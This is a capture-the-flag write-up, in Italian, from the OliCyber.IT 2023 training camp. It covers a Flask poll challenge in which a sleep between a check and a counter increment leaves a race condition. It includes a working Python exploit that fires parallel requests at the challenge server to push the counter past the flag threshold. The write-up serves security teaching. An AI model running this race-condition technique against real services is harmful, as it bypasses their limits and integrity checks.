# OliCyber.IT 2023 - Simulazione training camp 2

## [web] INVALSI (18 risoluzioni)

La challenge ci presenta un server in flask che ci propone un piccolo sondaggio.

Alla submission del form tuttavia i dati non vengono salvati ed al posto di questa operazione c'è una attesa attiva:

```python
if request.headers.get('Content-Type') == "application/json" and count == 0:
    data = request.json

    for r in data:
        # TODO: aggiungere i dati nel database
        # per adesso lo simulo con una sleep
        time.sleep(0.1)

    local_db[user_id] += 1

return render_template('poll.html', count=local_db[user_id])
```

Inoltre la flag viene mostrata solo se la variabile `local_db[user_id]` raggiunge un valore `>=3`, come da logica nel file del template:

```html
<h3 class="text-center">
  {% if count >= 3 %} {{ FLAG }} {% else %} Ritenta :/ {% endif %}
</h3>
```

### Soluzione

Sfruttando l'attesa attiva possiamo eseguire 3 richieste con un po' di dati all'interno, queste richieste in parallelo entreranno tutte e tre nell'if, verrano viste dal ciclo che attenderà e successivamente incrementeranno il contatore.

In questo modo possiamo aumentare il contatore a piacere anche se normalmente nell'if si dovrebbe entrare solo una volta.

### Exploit

```python
from multiprocessing import Pool
import requests
import random
import re

WORKER_NUMBER = 10

base_url = "http://invalsi.challs.olicyber.it"

r = requests.get(base_url)
session_cookie = r.cookies['session']


def worker(i):
    print(f"Request: {i}")

    requests.post(base_url, cookies={
        'session': session_cookie
    }, json=([{
        "arg": "value"
    }] * random.randint(5, 20) ))


pool = Pool(WORKER_NUMBER)
result = pool.map_async(worker, range(WORKER_NUMBER)).get(0xffff)

r = requests.get(f"{base_url}/flag", cookies={
    'session': session_cookie
})

f = re.findall('flag\{.*\}', r.text)
if len(f) > 0:
    print(f[0])
else:
    print("Zero luck")
```
